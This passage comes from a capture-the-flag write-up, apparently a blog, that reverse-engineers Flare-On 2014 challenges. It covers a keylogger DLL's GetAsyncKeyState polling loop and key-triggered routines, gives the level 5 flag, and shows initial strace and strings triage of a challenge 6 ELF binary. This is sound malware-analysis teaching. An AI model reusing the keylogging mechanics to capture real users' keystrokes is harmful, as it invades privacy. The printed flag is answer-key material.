&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EC1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;cx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EC5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;cx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:10009&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EC9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;cx&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; (var_4)++&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;; go back to line 14&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This is what we are looking for. First &lt;code&gt;var_4&lt;/code&gt; is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to &lt;code&gt;loc_1000A3A4&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If not we will reach line 18 where &lt;code&gt;var_4&lt;/code&gt; (initially 0) is stored in eax and pushed to stack as parameter for &lt;code&gt;GetAsyncKeyState&lt;/code&gt;. We already know what this function does. If &lt;code&gt;vKey&lt;/code&gt; has been pressed since last call to &lt;code&gt;GetAsyncKeyState&lt;/code&gt;, it will return a value. Otherwise it will return 0. This &lt;a href=&#34;http://reversing.be/forum/viewtopic.php?t=628&amp;amp;sid=bf0d5e83ef43f1c34c41cd5cd2793a76&#34; target=&#34;_blank&#34;&gt;forum thread from 2007&lt;/a&gt; discusses this usecase.&lt;br /&gt;
If the key was not pressed, we jump to line 26 and then 29 where &lt;code&gt;var_4&lt;/code&gt; is increased by 1. Then we go back to line 14 where &lt;code&gt;var_4&lt;/code&gt; is compared with 222 and the cycle is repeated.&lt;/p&gt;

&lt;p&gt;Now we know that the application loops through ascii characters from 0 to 222 checking to see if a key was pressed. If so we will not jump at line 23 and continue. Let&amp;rsquo;s take a look at that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-5.jpg&#34; alt=&#34;Key pressed&#34; title=&#34;Key pressed&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from &lt;code&gt;0x27&lt;/code&gt; to &lt;code&gt;0x60&lt;/code&gt;. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for &lt;code&gt;M&lt;/code&gt; or &lt;code&gt;0x4D&lt;/code&gt; caught my eye. Finding the code for &lt;code&gt;M&lt;/code&gt; and clicking on the red arrow besides it.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;If M is pressed&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1B6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A1B6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1B6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1BA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4Dh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1BD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_1000A1C9&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1BF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_10009AF0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;What is &lt;code&gt;sub_10009AF0&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-6.jpg&#34; alt=&#34;sub10009Af0&#34; title=&#34;sub10009AF0&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Nice, IDA has even tagged it as M for us. First we see that a &lt;code&gt;dword_10017000&lt;/code&gt; is compared to 0. and if it is larger than 0, two functions are called: &lt;code&gt;__cfltcvt_init&lt;/code&gt; and &lt;code&gt;sub_10001240&lt;/code&gt;. Then returns with value &lt;code&gt;m&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-7.jpg&#34; alt=&#34;__cfltcvt_init&#34; title=&#34;__cfltcvt_init&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;__cfltcvt_init&lt;/code&gt; sets one variable to 1 and resets the rest (including &lt;code&gt;dword_10017000&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sub_10001240&lt;/code&gt; creates a large array, initializes it with some values and then calles &lt;code&gt;GetWindowLong&lt;/code&gt; and &lt;code&gt;DialogBoxIndirectParam&lt;/code&gt;. I put a breakpoint in the end. Change the IP to the start of this function and ran the program.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-8.jpg&#34; alt=&#34;ASCII Flare&#34; title=&#34;ASCII Flare&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Nice! So to get this ASCII art we have to press M and &lt;code&gt;dword_10017000&lt;/code&gt; needs to be 0. Let&amp;rsquo;s get back to &lt;code&gt;sub_10009AF0&lt;/code&gt; and investigate &lt;code&gt;dword_10017000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Highlight &lt;code&gt;dword_10017000&lt;/code&gt; and press &lt;code&gt;x&lt;/code&gt; in IDA to see where this variable is being set to 1 (which will make the if true). There is only one place.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/5-9.jpg&#34; alt=&#34;Where M is set&#34; title=&#34;Where M is set&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Notice the &lt;code&gt;o&lt;/code&gt;? Now see that variable &lt;code&gt;dword_100194F8&lt;/code&gt; needs to be 1 to reach this line (top right). Follow that using &lt;code&gt;x&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So we have &lt;code&gt;m&lt;/code&gt; and then &lt;code&gt;o&lt;/code&gt;. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to &lt;code&gt;svchost.log&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&#34;level-5-flag-l0gging-ur-5tr0ke5-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Level 5 flag: l0gging.Ur.5tr0ke5@flare-on.com&lt;/h4&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;a-name-ch6-a-challenge-6-ida-appreciation-day:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;&lt;a name=&#34;ch6&#34;&gt;&lt;/a&gt; Challenge 6 - IDA Appreciation Day&lt;/h2&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Great success!
We&amp;#39;ve got another evil one for you, see if you can figure this out. This one will be rougher. Good luck!
-FLARE
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;While I was writing this solution, I saw this alternative way of solving the challenge. Great read: &lt;a href=&#34;http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html&#34; target=&#34;_blank&#34;&gt;Solving FireEye&amp;rsquo;s Flare On Six via Side Channels&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;New binary. Named &lt;code&gt;e7bc5d2c0cf4480348f5504196561297&lt;/code&gt;. Let&amp;rsquo;s google it and &lt;a href=&#34;http://pedump.me/e7bc5d2c0cf4480348f5504196561297/&#34; target=&#34;_blank&#34;&gt;first result&lt;/a&gt; is interesting. Filename has the &lt;code&gt;exe&lt;/code&gt; extension but it is a 64-bit ELF executable. Opening the file in &lt;code&gt;HxD&lt;/code&gt; shows us the ELF magic bytes.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Info from pedumpme&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;filename  spyEye1.4.exe
size      &lt;span style=&#34;color: #2AA198&#34;&gt;1221064&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x12a1c8&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;
md5       e7bc5d2c0cf4480348f5504196561297
&lt;span style=&#34;color: #B58900&#34;&gt;type&lt;/span&gt;      ELF 64-bit LSB executable, x86-64, version &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;, statically linked, &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; GNU/Linux 2.6.24, BuildID&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color: #719e07&#34;&gt;]=&lt;/span&gt;0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Running commands&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;# the same as the website&lt;/span&gt;
$ file e7bc5d2c0cf4480348f5504196561297 
e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;, statically linked, &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; GNU/Linux 2.6.24, BuildID&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color: #719e07&#34;&gt;]=&lt;/span&gt;0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped

$ strings e7bc5d2c0cf4480348f5504196561297
&lt;span style=&#34;color: #586E75&#34;&gt;# results in a bunch of random strings&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# looks like a mix of error messages, source code and random words&lt;/span&gt;
/index.html
Nosebleed   &lt;span style=&#34;color: #586E75&#34;&gt;# Heartbleed eh? :)&lt;/span&gt;
../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
info&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;20&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;-&amp;gt;d_un.d_val &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; 7
...

&lt;span style=&#34;color: #586E75&#34;&gt;# let&amp;#39;s see shared library calls - nope&lt;/span&gt;
$ ltrace ./e7bc5d2c0cf4480348f5504196561297 
ltrace: Couldn&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;t find .dynsym or .dynstr in &amp;quot;./e7bc5d2c0cf4480348f5504196561297&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #2AA198&#34;&gt;# Let&amp;#39;&lt;/span&gt;s run the binary manually
&lt;span style=&#34;color: #586E75&#34;&gt;# running it normally&lt;/span&gt;
$ ./e7bc5d2c0cf4480348f5504196561297 
no

&lt;span style=&#34;color: #586E75&#34;&gt;# one argument - different message&lt;/span&gt;
$ ./e7bc5d2c0cf4480348f5504196561297 arg1
na

&lt;span style=&#34;color: #586E75&#34;&gt;# longer argument - message did not change&lt;/span&gt;
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111
na

&lt;span style=&#34;color: #586E75&#34;&gt;# two arguments - message changed&lt;/span&gt;
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2
bad

&lt;span style=&#34;color: #586E75&#34;&gt;# three arguments - message changed - shoule we stop?&lt;/span&gt;
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
stahp

&lt;span style=&#34;color: #586E75&#34;&gt;# four arguments - message is the same - we should stop &lt;/span&gt;
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
stahp
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. &amp;lsquo;A&amp;rsquo;*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran &lt;code&gt;ltrace&lt;/code&gt; and didn&amp;rsquo;t see any shared library calls. Let&amp;rsquo;s run &lt;code&gt;strace&lt;/code&gt; to get system calls.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;strace output&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$ strace ./e7bc5d2c0cf4480348f5504196561297
execve&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f5504196561297&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f55041965612&amp;quot;&lt;/span&gt;...&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;/* &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt; vars */&lt;span style=&#34;color: #719e07&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
uname&lt;span style=&#34;color: #719e07&#34;&gt;({&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Linux&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #268BD2&#34;&gt;node&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;kali&amp;quot;&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                                  &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x13e5000
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x13e61c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x13e61c0
arch_prctl&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;ARCH_SET_FS, 0x13e5880&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x14071c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x14071c0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x1408000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x1408000
fstat&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #719e07&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;st_mode&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;S_IFCHR&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;0620, &lt;span style=&#34;color: #268BD2&#34;&gt;st_rdev&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;makedev&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;136, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
mmap&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;NULL, 4096, PROT_READ&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;MAP_ANONYMOUS, -1, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x7f20ba6fb000
write&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;no\n&amp;quot;&lt;/span&gt;, 3no
&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                     &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 3
exit_group&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;52&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; ?

$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1
execve&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f5504196561297&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;./e7bc5d2c0cf4480348f55041965612&amp;quot;&lt;/span&gt;..., &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;arg1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;/* &lt;span style=&#34;color: #2AA198&#34;&gt;31&lt;/span&gt; vars */&lt;span style=&#34;color: #719e07&#34;&gt;])&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
uname&lt;span style=&#34;color: #719e07&#34;&gt;({&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Linux&amp;quot;&lt;/span&gt;, &lt;span style=&#34;color: #268BD2&#34;&gt;node&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;kali&amp;quot;&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt;  &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                                  &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x18cb000
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x18cc1c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x18cc1c0
arch_prctl&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;ARCH_SET_FS, 0x18cb880&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x18ed1c0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x18ed1c0
brk&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;0x18ee000&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                          &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x18ee000
fstat&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #719e07&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;st_mode&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;S_IFCHR&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;0620, &lt;span style=&#34;color: #268BD2&#34;&gt;st_rdev&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;makedev&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;136, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;, ...&lt;span style=&#34;color: #719e07&#34;&gt;})&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0
mmap&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;NULL, 4096, PROT_READ&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span style=&#34;color: #93A1A1&#34;&gt;|&lt;/span&gt;MAP_ANONYMOUS, -1, 0&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 0x7ffd41ca2000
write&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;1, &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;na\n&amp;quot;&lt;/span&gt;, 3na
&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                     &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; 3
exit_group&lt;span style=&#34;color: #719e07&#34;&gt;(&lt;/span&gt;423&lt;span style=&#34;color: #719e07&#34;&gt;)&lt;/span&gt;                         &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; ?

$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
